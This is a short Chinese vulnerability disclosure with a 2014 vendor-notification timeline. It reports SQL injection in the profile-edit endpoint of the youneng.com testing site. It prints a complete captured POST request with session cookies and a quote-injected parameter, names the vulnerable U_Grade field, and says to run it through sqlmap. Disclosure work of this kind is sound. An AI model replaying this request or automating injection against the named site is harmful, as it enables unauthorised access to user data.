漏洞详情 披露状态：   									2014-01-08：	细节已通知厂商并且等待厂商处理中									2014-01-08：	厂商已经确认，细节仅向厂商公开									2014-01-18：	细节向核心白帽子及相关领域专家公开									2014-01-28：	细节向普通白帽子公开									2014-02-07：	细节向实习白帽子公开									2014-02-22：	细节向公众公开  简要描述： SQL注入 详细说明：  优能在线测评http://www.youneng.com/Manager/LoginLocation.aspx1. 注册一个用户，登录进去。 在修改信息处存在注入在U_Grade 字段处POST包：POST /FramePublic/pubJSONAjax.aspx HTTP/1.1Host: www.youneng.comProxy-Connection: keep-aliveContent-Length: 121Accept: */*Origin: http://www.youneng.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://www.youneng.com/xuzhou/EditUserInfo.aspxAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4Cookie: ASP.NET_SessionId=iquda355yofj1r55nte2bbyc; UCan_Cook=UserMail=qgB85iEAvo+EmQSfJ7Hw6A==; __utma=1.661037967.1389167762.1389167762.1389167762.1; __utmb=1.6.10.1389167762; __utmc=1; __utmz=1.1389167762.1.1.utmcsr=neworiental.org|utmccn=(referral)|utmcmd=referral|utmcct=/; Hm_lvt_73e0971524725ddb9941f249de49ee2b=1389168071; Hm_lpvt_73e0971524725ddb9941f249de49ee2b=1389168078U_Name=%E5%91%B5%E5%91%B5'&U_Sex=1&U_Grade=H&U_Tel=13815734567&TimeStamp=1389168091051&opercls=User&opercode=EditUserInfo丢SQLMAP里跑、
